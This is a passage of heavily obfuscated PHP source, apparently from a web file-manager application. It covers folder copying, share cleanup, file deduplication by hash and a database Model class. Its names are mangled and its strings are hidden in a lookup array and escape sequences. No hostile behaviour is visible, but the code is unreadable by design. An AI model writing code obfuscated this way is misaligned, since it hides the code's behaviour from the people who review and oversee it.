$Ÿµ¦ÏÖ¬[655] => $ÙîŠÈİ[$Ÿµ¦ÏÖ¬[190]], $Ÿµ¦ÏÖ¬[656] => $ÙîŠÈİ[$Ÿµ¦ÏÖ¬[573]], $Ÿµ¦ÏÖ¬[658] => USER_ID, $Ÿµ¦ÏÖ¬[496] => $‡ËÂœÍ‘); $ ñè¯Î = $¢‡°·©í[$Ÿµ¦ÏÖ¬[190]] == SourceModel::TYPE_GROUP && $ÙîŠÈİ[$Ÿµ¦ÏÖ¬[190]] == SourceModel::TYPE_GROUP && $¢‡°·©í[$Ÿµ¦ÏÖ¬[573]] == $ÙîŠÈİ[$Ÿµ¦ÏÖ¬[573]]; if (!$ ñè¯Î && $this->moveClearAuth) { Model($Ÿµ¦ÏÖ¬[571])->authClear($Øş¨ô£); } $ŒÖĞØ = $¢‡°·©í[$Ÿµ¦ÏÖ¬[507]] == $Ÿµ¦ÏÖ¬[91] && $ÙîŠÈİ[$Ÿµ¦ÏÖ¬[507]] != $Ÿµ¦ÏÖ¬[91]; if ($ŒÖĞØ) { $ÊÚ±ÙÛ®[$Ÿµ¦ÏÖ¬[506]] = 0; } if ($®¥ôõ£’) { $¢¨ÌÔğ = array($Ÿµ¦ÏÖ¬[659] => array($Ÿµ¦ÏÖ¬[619], $¢‡°·©í[$Ÿµ¦ÏÖ¬[588]] . $¢‡°·©í[$Ÿµ¦ÏÖ¬[193]] . $Ÿµ¦ÏÖ¬[620])); $³´óÎµ = $¢‡°·©í[$Ÿµ¦ÏÖ¬[588]] . $¢‡°·©í[$Ÿµ¦ÏÖ¬[193]] . $Ÿµ¦ÏÖ¬[50]; $ÊşÁª§ = $ÙîŠÈİ[$Ÿµ¦ÏÖ¬[588]] . $ÙîŠÈİ[$Ÿµ¦ÏÖ¬[193]] . $Ÿµ¦ÏÖ¬[50] . $¢‡°·©í[$Ÿµ¦ÏÖ¬[193]] . $Ÿµ¦ÏÖ¬[50]; $¨¬æ®°Ñ = array($Ÿµ¦ÏÖ¬[659] => array($Ÿµ¦ÏÖ¬[668], "\x72\145\160\154\x61\143\x65\50\x70\x61\162\145\156\x74\x4c\x65\166\x65\154\54\47{$³´óÎµ}\47\x2c\47{$ÊşÁª§}\47\51"), $Ÿµ¦ÏÖ¬[655] => $ÙîŠÈİ[$Ÿµ¦ÏÖ¬[190]], $Ÿµ¦ÏÖ¬[656] => $ÙîŠÈİ[$Ÿµ¦ÏÖ¬[573]]); if ($ŒÖĞØ) { $¨¬æ®°Ñ[$Ÿµ¦ÏÖ¬[506]] = 0; } $this->where($¢¨ÌÔğ)->data($¨¬æ®°Ñ)->save(); } $this->where(array($Ÿµ¦ÏÖ¬[493] => $Øş¨ô£))->data($ÊÚ±ÙÛ®)->save(); return $Øş¨ô£; } private function clearShare($¡ÕßÅÜ, $éÂ”èÃü) { $¯şœ·€Í =& $_SERVER[†ûãı«°]; $ß²ºì®¼ = $this->sourceInfo($¡ÕßÅÜ); $Ò§»û¿ê = $this->sourceInfo($éÂ”èÃü); if ($ß²ºì®¼[$¯şœ·€Í[573]] == $Ò§»û¿ê[$¯şœ·€Í[573]] && $ß²ºì®¼[$¯şœ·€Í[190]] == $¯şœ·€Í[669]) { return; } $¾¨ÙÇï = array($¯şœ·€Í[588] => array($¯şœ·€Í[619], $ß²ºì®¼[$¯şœ·€Í[588]] . $¡ÕßÅÜ . $¯şœ·€Í[620])); $ü¡Ä×¤µ = $this->field($¯şœ·€Í[493])->where($¾¨ÙÇï)->getField($¯şœ·€Í[193], !0); if (!$ü¡Ä×¤µ) { return; } $¾¨ÙÇï = array($¯şœ·€Í[193] => array($¯şœ·€Í[7], $ü¡Ä×¤µ), $¯şœ·€Í[670] => 1); $ùö‡Š¸ˆ = Model($¯şœ·€Í[671])->field($¯şœ·€Í[672])->where($¾¨ÙÇï)->select(); if (!$ùö‡Š¸ˆ) { return; } $ùö‡Š¸ˆ = array_to_keyvalue($ùö‡Š¸ˆ, $¯şœ·€Í[12], $¯şœ·€Í[672]); $¾¨ÙÇï = array($¯şœ·€Í[672] => array($¯şœ·€Í[7], $ùö‡Š¸ˆ)); Model($¯şœ·€Í[671])->where($¾¨ÙÇï)->save(array($¯şœ·€Í[670] => 0)); Model($¯şœ·€Í[673])->where($¾¨ÙÇï)->delete(); } public function copyFolderFromIO($ºÃç, $Öºªâû, $Š´³¯«, $³ë şñÖ, $°ä€éÑÄ, $Ø««ÓŞ = false) { $í½­Õû¡ =& $_SERVER[†ûãı«°]; $ªê¬‡èï = array($í½­Õû¡[637] => array(), $í½­Õû¡[638] => array(), $í½­Õû¡[636] => array(), $í½­Õû¡[674] => array()); $¯ƒ‡ˆÆŸ = $Ø««ÓŞ ? $Ø««ÓŞ : $ºÃç->pathThis($Öºªâû); $µŞé•õş = $this->fileNameExist($Š´³¯«, $¯ƒ‡ˆÆŸ); $ÈµÇÚ¡„ = $this->mkdir($Š´³¯«, $¯ƒ‡ˆÆŸ, $³ë şñÖ); if (!$µŞé•õş || $³ë şñÖ == REPEAT_RENAME_FOLDER) { $³ë şñÖ = !1; } if ($µŞé•õş) { $this->_childrenAllMake($µŞé•õş); } Hook::trigger($í½­Õû¡[675]); $this->_copyChildTo($ºÃç, $Öºªâû, $ÈµÇÚ¡„, $³ë şñÖ, $ªê¬‡èï, $°ä€éÑÄ); Hook::trigger($í½­Õû¡[676]); if ($ÈµÇÚ¡„) { $this->folderSizeResetChildren($ÈµÇÚ¡„); } $this->_childrenListClear(); Model($í½­Õû¡[639])->addAll($ªê¬‡èï[$í½­Õû¡[637]], array(), !0); Model($í½­Õû¡[640])->eventCopy($ÈµÇÚ¡„); $this->saveAll($ªê¬‡èï[$í½­Õû¡[638]]); Model($í½­Õû¡[548])->linkAdd($ªê¬‡èï[$í½­Õû¡[636]]); Model($í½­Õû¡[548])->remove($ªê¬‡èï[$í½­Õû¡[674]]); $this->folderSizeReset($Š´³¯«); $this->updateModifyTime($Š´³¯«); return $ÈµÇÚ¡„; } private function _copyChildTo($¢…‚½¤, $òø–®¹”, $Œö²íå­, $µŒæÂı±, &$Ş£¼Ÿ¦¯, $øõş¸±î) { $˜²¶Ù¶¼ =& $_SERVER[†ûãı«°]; $£ÄÍÆÂç = $this->sourceInfoCache($Œö²íå­); $Ùğİàí = $¢…‚½¤->listPath($òø–®¹”); $Ùğİàí = $Ùğİàí ? $Ùğİàí : array($˜²¶Ù¶¼[86] => array(), $˜²¶Ù¶¼[85] => array()); $¤·Àâ¦´ = array_merge($Ùğİàí[$˜²¶Ù¶¼[86]], $Ùğİàí[$˜²¶Ù¶¼[85]]); $ÆìÈ€¥ = $this->_addFiles($¢…‚½¤, $Ùğİàí[$˜²¶Ù¶¼[86]], $øõş¸±î); $¸¥‡úó° = array(); foreach ($¤·Àâ¦´ as &$™†âºà) { if (isset($ÆìÈ€¥[$™†âºà[$˜²¶Ù¶¼[32]]])) { $™†âºà = $ÆìÈ€¥[$™†âºà[$˜²¶Ù¶¼[32]]]; } $™†âºà[$˜²¶Ù¶¼[487]] = $™†âºà[$˜²¶Ù¶¼[33]] == $˜²¶Ù¶¼[78]; $™†âºà[$˜²¶Ù¶¼[488]] = substr(_get($™†âºà, $˜²¶Ù¶¼[169], $˜²¶Ù¶¼[12]), 0, 10); $™†âºà[$˜²¶Ù¶¼[79]] = _get($™†âºà, $˜²¶Ù¶¼[79], 0); $™†âºà[$˜²¶Ù¶¼[545]] = _get($™†âºà, $˜²¶Ù¶¼[545], 0); if (!isset($™†âºà[$˜²¶Ù¶¼[677]]) && $™†âºà[$˜²¶Ù¶¼[545]]) { $Ş£¼Ÿ¦¯[$˜²¶Ù¶¼[674]][] = $™†âºà[$˜²¶Ù¶¼[545]]; } if ($µŒæÂı±) { $«  —¼‰ = $this->fileNameExistCache($Œö²íå­, $™†âºà[$˜²¶Ù¶¼[32]]); if ($«  —¼‰) { if ($™†âºà[$˜²¶Ù¶¼[487]] || $µŒæÂı± == REPEAT_SKIP) { continue; } if ($µŒæÂı± == REPEAT_REPLACE) { $òÖÀŞçÂ = $this->sourceInfoCache($«  —¼‰); $òŒ‰âÏ  = $this->fileHistory($òÖÀŞçÂ, $™†âºà[$˜²¶Ù¶¼[545]], $™†âºà[$˜²¶Ù¶¼[79]]); if ($òŒ‰âÏ ) { $Ş£¼Ÿ¦¯[$˜²¶Ù¶¼[636]][] = $™†âºà[$˜²¶Ù¶¼[545]]; } continue; } else { if ($µŒæÂı± == REPEAT_RENAME) { $™†âºà[$˜²¶Ù¶¼[32]] = $this->fileNameAutoCache($Œö²íå­, $™†âºà[$˜²¶Ù¶¼[32]], $µŒæÂı±, !1); } } } } if (!$™†âºà[$˜²¶Ù¶¼[487]] && $™†âºà[$˜²¶Ù¶¼[545]] == 0) { continue; } if (!$™†âºà[$˜²¶Ù¶¼[487]] && $™†âºà[$˜²¶Ù¶¼[545]]) { $Ş£¼Ÿ¦¯[$˜²¶Ù¶¼[636]][] = $™†âºà[$˜²¶Ù¶¼[545]]; } $¸¥‡úó°[] = $this->_makeItemData($™†âºà, $£ÄÍÆÂç, $™†âºà[$˜²¶Ù¶¼[32]]); } unset($™†âºà); if (!empty($¸¥‡úó°)) { $this->addAll($¸¥‡úó°); $this->_childrenListSelect($Œö²íå­); } $¡¾À°ÀÖ = $this->_childrenList($Œö²íå­); $¡¾À°ÀÖ = array_to_keyvalue($¡¾À°ÀÖ, $˜²¶Ù¶¼[32]); foreach ($¤·Àâ¦´ as $™†âºà) { $òÖÀŞçÂ = $¡¾À°ÀÖ[$™†âºà[$˜²¶Ù¶¼[32]]]; $ÊãĞâ = $òÖÀŞçÂ[$˜²¶Ù¶¼[193]]; $this->_copyApplyMeta($òÖÀŞçÂ, $Ş£¼Ÿ¦¯); if ($™†âºà[$˜²¶Ù¶¼[33]] == $˜²¶Ù¶¼[78]) { $™†âºà[$˜²¶Ù¶¼[87]] = $¢…‚½¤->getPathInner($™†âºà[$˜²¶Ù¶¼[87]]); $this->_copyChildTo($¢…‚½¤, $™†âºà[$˜²¶Ù¶¼[87]], $ÊãĞâ, $µŒæÂı±, $Ş£¼Ÿ¦¯, $øõş¸±î); } } } private function _addFiles($•µä¨…«, $ÈÎ§ñáÀ, $¾¢ñŸìã) { $¢ÍÜÎÓ =& $_SERVER[†ûãı«°]; if (!$ÈÎ§ñáÀ || count($ÈÎ§ñáÀ) == 0) { return array(); } $ÌÒˆ¦· = array(); foreach ($ÈÎ§ñáÀ as &$ò×ÍàÎö) { Hook::trigger($¢ÍÜÎÓ[678], $ò×ÍàÎö); $ò×ÍàÎö[$¢ÍÜÎÓ[87]] = $•µä¨…«->getPathInner($ò×ÍàÎö[$¢ÍÜÎÓ[87]]); $‰Û›íÙÕ = $•µä¨…«->hashSimple($ò×ÍàÎö[$¢ÍÜÎÓ[87]]); $åı§üÈ = $•µä¨…«->hashMd5($ò×ÍàÎö[$¢ÍÜÎÓ[87]]); if (strlen($åı§üÈ) > 10 && !isset($ÌÒˆ¦·[$åı§üÈ])) { $ÌÒˆ¦·[$åı§üÈ] = array(); } $ò×ÍàÎö[$¢ÍÜÎÓ[679]] = $‰Û›íÙÕ; $ò×ÍàÎö[$¢ÍÜÎÓ[551]] = $åı§üÈ; $ÌÒˆ¦·[$åı§üÈ][] =& $ò×ÍàÎö; if (count($ÌÒˆ¦·[$åı§üÈ]) > 1) { $ò×ÍàÎö[$¢ÍÜÎÓ[677]] = !0; } Hook::trigger($¢ÍÜÎÓ[680], $ò×ÍàÎö); } unset($ò×ÍàÎö); $ÑÆŠ”çß = array($¢ÍÜÎÓ[551] => array($¢ÍÜÎÓ[7], array_keys($ÌÒˆ¦·))); $È‹Ä„× = Model($¢ÍÜÎÓ[681]); $ëÛæèÚ = $È‹Ä„×->where($ÑÆŠ”çß)->select(); $ëÛæèÚ = $ëÛæèÚ ? $ëÛæèÚ : array(); foreach ($ëÛæèÚ as $‰Ó½Ñ ã) { if (!isset($ÌÒˆ¦·[$‰Ó½Ñ ã[$¢ÍÜÎÓ[551]]])) { continue; } $ÌÆ”øñ™ = $ÌÒˆ¦·[$‰Ó½Ñ ã[$¢ÍÜÎÓ[551]]]; foreach ($ÌÆ”øñ™ as &$ò×ÍàÎö) { $ò×ÍàÎö[$¢ÍÜÎÓ[545]] = $‰Ó½Ñ ã[$¢ÍÜÎÓ[545]]; $ò×ÍàÎö[$¢ÍÜÎÓ[677]] = !0; } unset($ò×ÍàÎö); } $¨÷Ş¶ş˜ = array(); foreach ($ÈÎ§ñáÀ as $©¯ç¸†Ë) { Hook::trigger($¢ÍÜÎÓ[682], $©¯ç¸†Ë); if (isset($©¯ç¸†Ë[$¢ÍÜÎÓ[677]]) && $©¯ç¸†Ë[$¢ÍÜÎÓ[677]]) { Hook::trigger($¢ÍÜÎÓ[683], $©¯ç¸†Ë); continue; } $àÚ´½„¨ = $•µä¨…«->getPathInner($©¯ç¸†Ë[$¢ÍÜÎÓ[87]]); $’Ô¯Ó = $È‹Ä„×->addFileMake($àÚ´½„¨, $©¯ç¸†Ë[$¢ÍÜÎÓ[79]], $©¯ç¸†Ë[$¢ÍÜÎÓ[679]], $©¯ç¸†Ë[$¢ÍÜÎÓ[551]], $©¯ç¸†Ë[$¢ÍÜÎÓ[32]], $¾¢ñŸìã); Hook::trigger($¢ÍÜÎÓ[683], $©¯ç¸†Ë); if (!is_array($’Ô¯Ó)) { continue; } $¨÷Ş¶ş˜[] = $’Ô¯Ó; } $È‹Ä„×->addAll($¨÷Ş¶ş˜); $ÑÆŠ”çß = array($¢ÍÜÎÓ[551] => array($¢ÍÜÎÓ[7], array_keys($ÌÒˆ¦·))); $ëÛæèÚ = $È‹Ä„×->where($ÑÆŠ”çß)->select(); $ëÛæèÚ = $ëÛæèÚ ? $ëÛæèÚ : array(); foreach ($ëÛæèÚ as $‰Ó½Ñ ã) { if (!isset($ÌÒˆ¦·[$‰Ó½Ñ ã[$¢ÍÜÎÓ[551]]])) { continue; } $­à–« =& $ÌÒˆ¦·[$‰Ó½Ñ ã[$¢ÍÜÎÓ[551]]]; foreach ($­à–« as &$ò×ÍàÎö) { $ò×ÍàÎö[$¢ÍÜÎÓ[545]] = $‰Ó½Ñ ã[$¢ÍÜÎÓ[545]]; } unset($ò×ÍàÎö); } $Ò¬¯æúÎ = array(); foreach ($ÈÎ§ñáÀ as $î·¦¨ÊÉ) { $Ò¬¯æúÎ[$î·¦¨ÊÉ[$¢ÍÜÎÓ[32]]] = $î·¦¨ÊÉ; } return $Ò¬¯æúÎ; } } define($_SERVER[†ûãı«°][684], $_SERVER[†ûãı«°][685]); $uwclhaifnk = $_SERVER[†ûãı«°][686]; goto eÑ¬Ğô¯; F£ó¯Š‡Ò: define($_SERVER[†ûãı«°][322], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\x62\154\x65", "\157\x72\x64\145\162", "\141\154\x69\141\x73", "\150\x61\166\151\x6e\147", "\x67\x72\x6f\165\160", "\154\157\143\153", "\x64\151\x73\164\151\156\143\x74", "\x61\x75\x74\157", "\146\x69\154\x74\x65\162", "\166\x61\154\x69\144\141\164\145", "\162\x65\163\165\x6c\x74", "\142\x69\156\x64", "\x74\x6f\x6b\x65\156"); public function __construct($Ü¥»€ƒğ = '', $†Æ¾€‰ = '', $Äˆ©èó = '') { $²¾€…Â =& $_SERVER[†ûãı«°]; $this->_initialize(); if (!empty($Ü¥»€ƒğ)) { if (strpos($Ü¥»€ƒğ, $²¾€…Â[10])) { list($this->dbName, $this->name) = explode($²¾€…Â[10], $Ü¥»€ƒğ); } else { $this->name = $Ü¥»€ƒğ; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($†Æ¾€‰)) { $this->tablePrefix = $²¾€…Â[12]; } elseif ($²¾€…Â[12] != $†Æ¾€‰) { $this->tablePrefix = $†Æ¾€‰; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($²¾€…Â[323]); } $this->db(0, empty($this->connection) ? $Äˆ©èó : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $×±˜Ìªâ =& $_SERVER[†ûãı«°]; if (empty($this->fields)) { if (think_config($×±˜Ìªâ[324])) { $»Ù«ºà = $this->dbName ? $this->dbName : think_config($×±˜Ìªâ[325]); $ÜŸó‡˜½ = think_var_cache($×±˜Ìªâ[326] . strtolower(get_path_this($»Ù«ºà) . $×±˜Ìªâ[10] . $this->name)); if ($ÜŸó‡˜½) { $ø»„…àâ = think_config($×±˜Ìªâ[327]); if (empty($ø»„…àâ) || $ÜŸó‡˜½[$×±˜Ìªâ[328]] == $ø»„…àâ) { $this->fields = $ÜŸó‡˜½; return; } } } $this->flush(); } } public function flush() { $ÃËÊ¶ê‘ =& $_SERVER[†ûãı«°]; $this->db->setModel($this->name); $æá¼‚ ƒ = $this->db->getFields($this->getTableName()); if (!$æá¼‚ ƒ) { return !1; } $this->fields = array_keys($æá¼‚ ƒ); $this->fields[$ÃËÊ¶ê‘[329]] = !1; foreach ($æá¼‚ ƒ as $Ù€œÉÙº => $ˆâÄÈì) { $Ê‡™¾Ğ[$Ù€œÉÙº] = $ˆâÄÈì[$ÃËÊ¶ê‘[33]]; if ($ˆâÄÈì[$ÃËÊ¶ê‘[39]]) { $this->fields[$ÃËÊ¶ê‘[330]] = $Ù€œÉÙº; if ($ˆâÄÈì[$ÃËÊ¶ê‘[42]]) { $this->fields[$ÃËÊ¶ê‘[329]] = !0; } } } $this->fields[$ÃËÊ¶ê‘[331]] = $Ê‡™¾Ğ; if (think_config($ÃËÊ¶ê‘[327])) { $this->fields[$ÃËÊ¶ê‘[328]] = think_config($ÃËÊ¶ê‘[327]); } if (think_config($ÃËÊ¶ê‘[324])) { $ ”‹Îşå = $this->dbName ? $this->dbName : think_config($ÃËÊ¶ê‘[325]); think_var_cache($ÃËÊ¶ê‘[326] . strtolower(get_path_this($ ”‹Îşå) . $ÃËÊ¶ê‘[10] . $this->name), $this->fields); } } public function switchModel($Ù¸«éß, $ÌŠØ–ë = array()) { $ôôÔ€Å =& $_SERVER[†ûãı«°]; $³šÎ—Ÿ = ucwords(strtolower($Ù¸«éß)) . $ôôÔ€Å[332]; if (!class_exists($³šÎ—Ÿ)) { think_exception($³šÎ—Ÿ . think_lang($ôôÔ€Å[333])); } $this->_extModel = new $³šÎ—Ÿ($this->name); if (!empty($ÌŠØ–ë)) { foreach ($ÌŠØ–ë as $éñÓúûÈ) { $this->_extModel->setProperty($éñÓúûÈ, $this->{$éñÓúûÈ}); } } return $this->_extModel; } public function __set($æ‰×†ŞÁ, $­«é”£†) { $this->data[$æ‰×†ŞÁ] = $­«é”£†; } public function __get($—Î‚÷Õå) { return isset($this->data[$—Î‚÷Õå]) ? $this->data[$—Î‚÷Õå] : null; } public function __isset($ëËÙ™ÙÖ) { return isset($this->data[$ëËÙ™ÙÖ]); } public function __unset($Ÿ¶éı) { unset($this->data[$Ÿ¶éı]); } public function __call($›öˆŞ™™, $Ñú€ç) { $²³¸¹Ï =& $_SERVER[†ûãı«°]; if (in_array(strtolower($›öˆŞ™™), $this->methods, !0)) { $this->options[strtolower($›öˆŞ™™)] = $Ñú€ç[0]; return $this; } elseif (in_array(strtolower($›öˆŞ™™), array($²³¸¹Ï[334], $²³¸¹Ï[335], $²³¸¹Ï[336], $²³¸¹Ï[337], $²³¸¹Ï[338]), !0)) { $Û«·‘ø = isset($Ñú€ç[0]) ? $Ñú€ç[0] : $²³¸¹Ï[222]; $Û«·‘ø = $this->db->parseKey($Û«·‘ø); return $this->getField(strtoupper($›öˆŞ™™) . $²³¸¹Ï[339] . $Û«·‘ø . $²³¸¹Ï[340] . $›öˆŞ™™, $²³¸¹Ï[334]); } elseif (strtolower(substr($›öˆŞ™™, 0, 5)) == $²³¸¹Ï[341]) { $Û«·‘ø = think_parse_name(substr($›öˆŞ™™, 5)); $åè²›€œ[$Û«·‘ø] = $Ñú€ç[0]; return $this->where($åè²›€œ)->find(); } elseif (strtolower(substr($›öˆŞ™™, 0, 10)) == $²³¸¹Ï[342]) { $ş»÷ü = think_parse_name(substr($›öˆŞ™™, 10)); $åè²›€œ[$ş»÷ü] = $Ñú€ç[0]; return $this->where($åè²›€œ)->getField($Ñú€ç[1]); } elseif (isset($this->_scope[$›öˆŞ™™])) { return $this->scope($›öˆŞ™™, $Ñú€ç[0]); } elseif (method_exists($this, $›öˆŞ™™)) { array_unshift($Ñú€ç, $›öˆŞ™™); return call_user_func_array(array($this, $²³¸¹Ï[343]), $Ñú€ç); } else { return call_user_func_array(array(parent, $›öˆŞ™™), $Ñú€ç); } } protected function call() { $í€ÃÖíÂ =& $_SERVER[†ûãı«°]; $®šÇÒŸ· = func_get_args(); $ñúÖŠì› = array_shift($®šÇÒŸ·); $çëÂŠÈú = $ñúÖŠì›; if (is_array($ñúÖŠì›)) { $çëÂŠÈú = $ñúÖŠì›[1]; $ñúÖŠì› = $ñúÖŠì›[0]; } $¶‚¤Ó£ = count($®šÇÒŸ·) - 1; if (isset($®šÇÒŸ·[$¶‚¤Ó£]) && $®šÇÒŸ·[$¶‚¤Ó£] === $ñúÖŠì›) { think_exception(__CLASS__ . $í€ÃÖíÂ[4] . $ñúÖŠì› . think_lang($í€ÃÖíÂ[344])); return; } $®šÇÒŸ·[] = $ñúÖŠì›; if (method_exists($this, $í€ÃÖíÂ[345])) { $†³ŸÚ÷¼ = call_user_func_array(array($this, $í€ÃÖíÂ[346]), array($çëÂŠÈú, $®šÇÒŸ·)); if (!is_null($†³ŸÚ÷¼) && $†³ŸÚ÷¼ !== !1) { return $†³ŸÚ÷¼; } } $¶şãµ‘› = call_user_func_array(array($this, $ñúÖŠì›), $®šÇÒŸ·); if (method_exists($this, $í€ÃÖíÂ[347])) { $†³ŸÚ÷¼ = call_user_func_array(array($this, $í€ÃÖíÂ[348]), array($çëÂŠÈú, $®šÇÒŸ·, $¶şãµ‘›)); if ($†³ŸÚ÷¼) { return $†³ŸÚ÷¼; } } return $¶şãµ‘›; } protected function _initialize() { } protected function _facade($–üêˆÛ) { $ç‘Ğö‘Ç =& $_SERVER[†ûãı«°]; if (!empty($this->fields)) { foreach ($–üêˆÛ as $‰Õ ¥ªõ => $´‘›Ÿˆç) { if (is_array($this->fields) && !in_array($‰Õ ¥ªõ, $this->fields, !0)) { unset($–üêˆÛ[$‰Õ ¥ªõ]); } elseif (is_scalar($´‘›Ÿˆç)) { $this->_parseType($–üêˆÛ, $‰Õ ¥ªõ); } } } if (!empty($this->options[$ç‘Ğö‘Ç[349]])) { $–üêˆÛ = array_map($this->options[$ç‘Ğö‘Ç[349]], $–üêˆÛ); unset($this->options[$ç‘Ğö‘Ç[349]]); } $this->_beforeWrite($–üêˆÛ); return $–üêˆÛ; } protected function _beforeWrite(&$ùŠé¦¢) { } public function add($”–°Ò = '', $ÆÇ¦´é = array(), $×•ÕÚÛé = false) { if (empty($”–°Ò)) { if (!empty($this->data)) { $”–°Ò = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[†ûãı«°][350]); return !1; } } $ÆÇ¦´é = $this->_parseOptions($ÆÇ¦´é); $”–°Ò = $this->_facade($”–°Ò); if (!1 === $this->_beforeInsert($”–°Ò, $ÆÇ¦´é)) { return !1; } $Ó³±ËÇˆ = $this->db->insert($”–°Ò, $ÆÇ¦´é, $×•ÕÚÛé); if (!1 !== $Ó³±ËÇˆ) { $¹Ï·‹Ğ­ = $this->getLastInsID(); if ($¹Ï·‹Ğ­) { $”–°Ò[$this->getPk()] = $¹Ï·‹Ğ­; $this->_after_insert($”–°Ò, $ÆÇ¦´é); return $¹Ï·‹Ğ­; } $this->_after_insert($”–°Ò, $ÆÇ¦´é); } return $Ó³±ËÇˆ; } protected function _beforeInsert(&$¨š¹Ïô, $‹Ùò Ñ¥) { } protected function _after_insert($Öï—ê, $°Í»öø) { } public function addAll($‡ĞäÚóŸ, $¿Çãèü = array(), $Ú”‚ïŞ€ = false) { $•ÚìÑ• =& $_SERVER[†ûãı«°]; if (empty($‡ĞäÚóŸ)) { $this->error = think_lang($•ÚìÑ•[350]); return !1; } $¿Çãèü = $this->_parseOptions($¿Çãèü); foreach ($‡ĞäÚóŸ as $°Ÿ¸ÖÎœ => $Úâ€êÁ‡) { $‡ĞäÚóŸ[$°Ÿ¸ÖÎœ] = $this->_facade($Úâ€êÁ‡); } if (method_exists($this->db, $•ÚìÑ•[351])) { $â‚Û”å“ = $this->db->insertAll($‡ĞäÚóŸ, $¿Çãèü, $Ú”‚ïŞ€); } else { $this->startTrans(); foreach ($‡ĞäÚóŸ as $°Ÿ¸ÖÎœ => $Úâ€êÁ‡) { $â‚Û”å“ = $this->db->insert($Úâ€êÁ‡, $¿Çãèü, $Ú”‚ïŞ€); } $this->commit(); } if (!1 !== $â‚Û”å“) { $Ú»œ‚Áİ = $this->getLastInsID(); if ($Ú»œ‚Áİ) { return $Ú»œ‚Áİ; } } return $â‚Û”å“; } public function selectAdd($àÃÏÂÏÃ = '', $Ä„ÃÖŠ› = '', $â…ÊŠ Í = array()) { $Ã¨ì¯ =& $_SERVER[†ûãı«°]; $â…ÊŠ Í = $this->_parseOptions($â…ÊŠ Í); if (!1 === ($Š®ŒÂ»ú = $this->db->selectInsert($àÃÏÂÏÃ ? $àÃÏÂÏÃ : $â…ÊŠ Í[$Ã¨ì¯[352]], $Ä„ÃÖŠ› ? $Ä„ÃÖŠ› : $this->getTableName(), $â…ÊŠ Í))) { $this->error = think_lang($Ã¨ì¯[353]); return !1; } else { return $Š®ŒÂ»ú; } } public function save($ŒĞûš™« = '', $İÍº×‘¶ = array()) { $µµ¿óá¹ =& $_SERVER[†ûãı«°]; if (empty($ŒĞûš™«)) { if (!empty($this->data)) { $ŒĞûš™« = $this->data; $this->data = array(); } else { $this->error = think_lang($µµ¿óá¹[350]); return !1; } } $ŒĞûš™« = $this->_facade($ŒĞûš™«); $İÍº×‘¶ = $this->_parseOptions($İÍº×‘¶); $Â‘ˆ«¥Ò = $this->getPk(); if (!isset($İÍº×‘¶[$µµ¿óá¹[354]])) { if (isset($ŒĞûš™«[$Â‘ˆ«¥Ò])) { $—ÒşÚâË[$Â‘ˆ«¥Ò] = $ŒĞûš™«[$Â‘ˆ«¥Ò]; $İÍº×‘¶[$µµ¿óá¹[354]] = $—ÒşÚâË; unset($ŒĞûš™«[$Â‘ˆ«¥Ò]); } else { $this->error = think_lang($µµ¿óá¹[353]); return !1; } } if (is_array($İÍº×‘¶[$µµ¿óá¹[354]]) && isset($İÍº×‘¶[$µµ¿óá¹[354]][$Â‘ˆ«¥Ò])) { $Àïä˜×Û = $İÍº×‘¶[$µµ¿óá¹[354]][$Â‘ˆ«¥Ò]; } if (!1 === $this->_beforeUpdate($ŒĞûš™«, $İÍº×‘¶)) { return !1; } $ì£ÍÉ€ = $this->db->update($ŒĞûš™«, $İÍº×‘¶); if (!1 !== $ì£ÍÉ€) { if (isset($Àïä˜×Û)) { $ŒĞûš™«[$Â‘ˆ«¥Ò] = $Àïä˜×Û; } $this->_afterUpdate($ŒĞûš™«, $İÍº×‘¶); } return $ì£ÍÉ€; } protected function _beforeUpdate(&$ü›íë, $¶Àß™£³) { } protected function _afterUpdate($šåÌÉºˆ, $ê Œï¸¶) { } public function delete($¼êÑÃùÚ = array()) { $¼´¢¾¯û =& $_SERVER[†ûãı«°]; if (empty($¼êÑÃùÚ) && empty($this->options[$¼´¢¾¯û[354]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $•»Úİê  = $this->getPk(); if (is_numeric($¼êÑÃùÚ) || is_string($¼êÑÃùÚ)) { if (strpos($¼êÑÃùÚ, $¼´¢¾¯û[50])) { $¦•§ÄÒû[$•»Úİê ] = array($¼´¢¾¯û[355], $¼êÑÃùÚ); } else { $¦•§ÄÒû[$•»Úİê ] = $¼êÑÃùÚ; } $this->options[$¼´¢¾¯û[354]] = $¦•§ÄÒû; } $¼êÑÃùÚ = $this->_parseOptions(); if (is_array($¼êÑÃùÚ[$¼´¢¾¯û[354]]) && isset($¼êÑÃùÚ[$¼´¢¾¯û[354]][$•»Úİê ])) { $ªŞÙ¿ğí = $¼êÑÃùÚ[$¼´¢¾¯û[354]][$•»Úİê ]; } $˜‘˜° = $this->db->delete($¼êÑÃùÚ); if (!1 !== $˜‘˜°) { $òÔõã×Ã = array(); if (isset($ªŞÙ¿ğí)) { $òÔõã×Ã[$•»Úİê ] = $ªŞÙ¿ğí; } $this->_after_delete($òÔõã×Ã, $¼êÑÃùÚ); } return $˜‘˜°; } protected function _after_delete($—¤Ëµş“, $­„ìÛ¢€) { } public function select($…òÍÄ˜¥ = array()) { $Ñ´³ı›É =& $_SERVER[†ûãı«°]; if (is_string($…òÍÄ˜¥) || is_numeric($…òÍÄ˜¥)) { $¡™İŠ¨Ã = $this->getPk(); if (strpos($…òÍÄ˜¥, $Ñ´³ı›É[50])) { $«Ñ‘ûç[$¡™İŠ¨Ã] = array($Ñ´³ı›É[355], $…òÍÄ˜¥); } else { $«Ñ‘ûç[$¡™İŠ¨Ã] = $…òÍÄ˜¥; } $this->options[$Ñ´³ı›É[354]] = $«Ñ‘ûç; } elseif (!1 === $…òÍÄ˜¥) { $…òÍÄ˜¥ = $this->_parseOptions(); return $Ñ´³ı›É[356] . 